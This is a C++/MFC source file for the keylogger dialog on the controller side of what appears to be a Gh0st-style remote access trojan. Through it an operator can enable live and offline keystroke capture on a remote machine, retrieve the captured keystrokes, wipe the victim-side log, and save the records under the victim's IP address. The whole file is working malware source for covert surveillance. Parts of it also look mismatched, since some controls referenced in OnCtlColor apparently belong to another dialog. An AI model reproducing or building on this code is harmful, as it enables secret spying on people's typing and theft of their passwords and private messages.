// KeyBoardDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "KeyBoardDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define IDM_ENABLE_OFFLINE	0x0010
#define IDM_CLEAR_RECORD	0x0011
#define IDM_SAVE_RECORD		0x0012
/////////////////////////////////////////////////////////////////////////////
// CKeyBoardDlg dialog
BOOL addlog =TRUE;

CKeyBoardDlg::CKeyBoardDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CKeyBoardDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CKeyBoardDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
	
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	m_hIcon	= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_KEYBOARD));
	m_bIsOfflineRecord = (BYTE)m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1];
}


void CKeyBoardDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CKeyBoardDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
	DDX_Control(pDX, IDC_OLKEYLOG, m_olkeylog);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CKeyBoardDlg, CDialog)
	//{{AFX_MSG_MAP(CKeyBoardDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_BN_CLICKED(IDC_SENDKEY, OnSendkey)
	ON_BN_CLICKED(IDC_DELKEY, OnDelkey)
	ON_BN_CLICKED(IDC_SAVEKEY, OnSavekey)
	ON_BN_CLICKED(IDC_OLKEYLOG, OnOlkeylog)
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardDlg message handlers

BOOL CKeyBoardDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

	SetDlgItemText(IDC_STATICKEY, "Test:\r\n");

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度
	UpdateTitle();

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	
	GetDlgItem(IDC_SENDKEY)->EnableWindow(FALSE);
	m_olkeylog.SetCheck(TRUE);
	
	return TRUE;
}
void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == IDM_ENABLE_OFFLINE)
	{
		CMenu* pSysMenu = GetSystemMenu(FALSE);
		if (pSysMenu != NULL)
		{
			BYTE bToken = COMMAND_KEYBOARD_OFFLINE;
			m_iocpServer->Send(m_pContext, &bToken, 1);
			m_bIsOfflineRecord = !m_bIsOfflineRecord;
			if (m_bIsOfflineRecord)
				pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_CHECKED);
			else
				pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_UNCHECKED);
		}
		UpdateTitle();

	}
	else if (nID == IDM_CLEAR_RECORD)
	{
		BOOL addlog =TRUE;
		BYTE bToken = COMMAND_KEYBOARD_CLEAR;
		m_iocpServer->Send(m_pContext, &bToken, 1);
		m_edit.SetWindowText("");
	}
	else if (nID == IDM_SAVE_RECORD)
	{
		SaveRecord();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}
void CKeyBoardDlg::OnReceiveComplete()
{	
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_KEYBOARD_DATA:
		AddKeyBoardData();
		break;
	default:
		// 传输发生异常数据
		SendException();
		break;
	}
}

void CKeyBoardDlg::SendException()
{
	BYTE bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CKeyBoardDlg::OnClose()
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialog::OnClose();
}

HBRUSH CKeyBoardDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	int nCtrlID = pWnd->GetDlgCtrlID();
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	if ((nCtrlID == IDC_EDIT_LOG) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr); //设置绿色的文本
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr); //设置黑色的背景
		hbr = CreateSolidBrush(clr); //作为约定，返回背景色对应的刷子句柄
	}
	else if ((nCtrlID==IDC_EDIT_HOST ||nCtrlID==IDC_EDIT_PORT) && m_lanpenetrate)
	{
		COLORREF clr = RGB(255, 0, 0);
		pDC->SetTextColor(clr);   //穿透开启设置红色的文本
	}
	return hbr;
}
void CKeyBoardDlg::AddKeyBoardData()
{
	if(!addlog)
	{
		addlog=TRUE;
		return;
	}
	// 最后填上0
	m_edit.SetWindowText("");
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1));
}

void CKeyBoardDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
}

void CKeyBoardDlg::ResizeEdit()
{
// 	RECT	rectClient;
// 	RECT	rectEdit;
// 	GetClientRect(&rectClient);
// 	rectEdit.left = 0;
// 	rectEdit.top = 0;
// 	rectEdit.right = rectClient.right;
// 	rectEdit.bottom = rectClient.bottom;
// 	m_edit.MoveWindow(&rectEdit);
}

void CKeyBoardDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

bool CKeyBoardDlg::SaveRecord()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.txt");
	CFileDialog dlg(FALSE, "txt", strFileName, OFN_OVERWRITEPROMPT, "(*.txt)|*.txt|", this);
	if(dlg.DoModal () != IDOK)
		return false;
	
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		SetDlgItemText(IDC_STATICKEY,"提示信息：记录文件保存失败！");
		return false;
	}
	// Write the DIB header and the bits
	CString	strRecord;
	m_edit.GetWindowText(strRecord);
	file.Write(strRecord, strRecord.GetLength());
	file.Close();
	SetDlgItemText(IDC_STATICKEY,"提示信息：记录文件保存成功！");
	return true;
}

BOOL CKeyBoardDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}	
	return CDialog::PreTranslateMessage(pMsg);
}

void CKeyBoardDlg::UpdateTitle()
{
	CString str;
	str.Format("键盘记录 \\\\ %s", m_IPAddress);
	SetWindowText(str);	
}

void CKeyBoardDlg::OnSendkey() 
{
	// TODO: Add your control notification handler code here
	m_edit.SetWindowText("");//先将数据清空
	BYTE bToken = COMMAND_SEND_KEYBOARD;
	m_iocpServer->Send(m_pContext, &bToken, 1);
	SetDlgItemText(IDC_STATICKEY,"提示信息：获取记录命令发送成功！");
}

void CKeyBoardDlg::OnDelkey() 
{
	// TODO: Add your control notification handler code here
	addlog=FALSE;
	BYTE bToken = COMMAND_KEYBOARD_CLEAR;
	m_iocpServer->Send(m_pContext, &bToken, 1);
	m_edit.SetWindowText("");
	SetDlgItemText(IDC_STATICKEY,"提示信息：清除记录命令发送成功！");
}

void CKeyBoardDlg::OnSavekey() 
{
	// TODO: Add your control notification handler code here
	SaveRecord();
}
void CKeyBoardDlg::OnOlkeylog() 
{
	// TODO: Add your control notification handler code here
	if(m_olkeylog.GetCheck())
	{
		GetDlgItem(IDC_SENDKEY)->EnableWindow(FALSE);
		SetDlgItemText(IDC_STATICKEY,"实时获取已开启！");
		BYTE bToken = COMMAND_KEYBOARD_OLKEYLOG;
		m_iocpServer->Send(m_pContext, &bToken, 1);
	}
	else
	{
		GetDlgItem(IDC_SENDKEY)->EnableWindow(TRUE);
		SetDlgItemText(IDC_STATICKEY,"实时获取已关闭！");
		BYTE bToken = COMMAND_KEYBOARD_OLKEYLOG_OFF;
		m_iocpServer->Send(m_pContext, &bToken, 1);
	}	
}